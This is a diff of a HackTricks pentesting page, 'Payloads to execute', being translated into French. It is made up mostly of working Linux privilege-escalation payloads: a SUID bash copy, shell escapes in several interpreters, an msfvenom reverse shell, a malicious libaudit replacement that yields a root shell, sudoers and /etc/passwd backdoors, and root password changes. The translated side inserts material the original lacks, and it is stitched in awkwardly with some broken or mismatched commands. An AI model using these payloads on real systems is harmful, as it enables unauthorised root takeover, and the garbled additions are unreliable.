@@ -1,26 +1,86 @@
-# Payloads to execute
+# Charges utiles à exécuter
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 ## Bash
-
 ```bash
 cp /bin/bash /tmp/b && chmod +s /tmp/b
 /bin/b -p #Maintains root privileges from suid, working in debian & buntu
 ```
+## Charges utiles à exécuter
 
-## C
+Les charges utiles suivantes peuvent être utilisées pour exécuter des commandes en tant que superutilisateur ou pour obtenir un shell interactif en tant que superutilisateur.
 
+### Bash
+
+```bash
+bash -p
+```
+
+### Python
+
+```python
+python -c 'import os; os.system("/bin/bash")'
+```
+
+### Perl
+
+```perl
+perl -e 'exec "/bin/sh";'
+```
+
+### Ruby
+
+```ruby
+ruby -e 'exec "/bin/sh"'
+```
+
+### Lua
+
+```lua
+lua -e "os.execute('/bin/sh')"
+```
+
+### VI
+
+```vim
+:!bash
+```
+
+### Nmap
+
+```nmap
+!sh
+```
+
+### MySQL
+
+```mysql
+\! /bin/bash
+```
+
+### MSFVenom
+
+```msfvenom
+msfvenom -p cmd/unix/reverse_python LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f raw > shell.py
+python shell.py
+```
+
+### PowerShell
+
+```powershell
+powershell -c "Start-Process cmd -Verb RunAs"
+```
 ```c
 //gcc payload.c -o payload
 int main(void){
@@ -57,20 +117,18 @@ int main(void) {
     return 0;
 }
 ```
+## Écraser un fichier pour escalader les privilèges
 
-## Overwriting a file to escalate privileges
+### Fichiers courants
 
-### Common files
+* Ajouter un utilisateur avec un mot de passe à _/etc/passwd_
+* Changer le mot de passe dans _/etc/shadow_
+* Ajouter un utilisateur aux sudoers dans _/etc/sudoers_
+* Abuser de Docker via la socket Docker, généralement dans _/run/docker.sock_ ou _/var/run/docker.sock_
 
-* Add user with password to _/etc/passwd_
-* Change password inside _/etc/shadow_
-* Add user to sudoers in _/etc/sudoers_
-* Abuse docker through the docker socket, usually in _/run/docker.sock_ or _/var/run/docker.sock_
+### Écraser une bibliothèque
 
-### Overwriting a library
-
-Check a library used by some binary, in this case `/bin/su`:
-
+Vérifier une bibliothèque utilisée par un binaire, dans ce cas `/bin/su`:
 ```bash
 ldd /bin/su
         linux-vdso.so.1 (0x00007ffef06e9000)
@@ -82,10 +140,8 @@ ldd /bin/su
         libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
         /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-
-In this case lets try to impersonate `/lib/x86_64-linux-gnu/libaudit.so.1`.\
-So, check for functions of this library used by the **`su`** binary:
-
+Dans ce cas, essayons de nous faire passer pour `/lib/x86_64-linux-gnu/libaudit.so.1`.\
+Donc, vérifiez les fonctions de cette bibliothèque utilisées par le binaire **`su`** :
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -93,9 +149,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-
-The symbols `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` and `audit_fd` are probably from the libaudit.so.1 library. As the libaudit.so.1 will be overwritten by the malicious shared library, these symbols should be present in the new shared library, otherwise the program will not be able to find the symbol and will exit.
-
+Les symboles `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` et `audit_fd` proviennent probablement de la bibliothèque libaudit.so.1. Comme la bibliothèque libaudit.so.1 sera remplacée par la bibliothèque partagée malveillante, ces symboles doivent être présents dans la nouvelle bibliothèque partagée, sinon le programme ne pourra pas trouver le symbole et sortira.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -117,39 +171,38 @@ void inject()
     system("/bin/bash");
 }
 ```
-
-Now, just calling **`/bin/su`** you will obtain a shell as root.
+Maintenant, en appelant simplement **`/bin/su`**, vous obtiendrez un shell en tant que root.
 
 ## Scripts
 
-Can you make root execute something?
+Pouvez-vous faire exécuter quelque chose en tant que root?
 
-### **www-data to sudoers**
-
+### **www-data en sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
+### **Changer le mot de passe root**
 
-### **Change root password**
+```bash
+echo "new_password" | sudo passwd root --stdin
+```
 
+Cette commande permet de changer le mot de passe de l'utilisateur root en utilisant un nouveau mot de passe spécifié dans la commande.
 ```bash
 echo "root:hacked" | chpasswd
 ```
-
-### Add new root user to /etc/passwd
-
+### Ajouter un nouvel utilisateur root à /etc/passwd
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live).
+* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
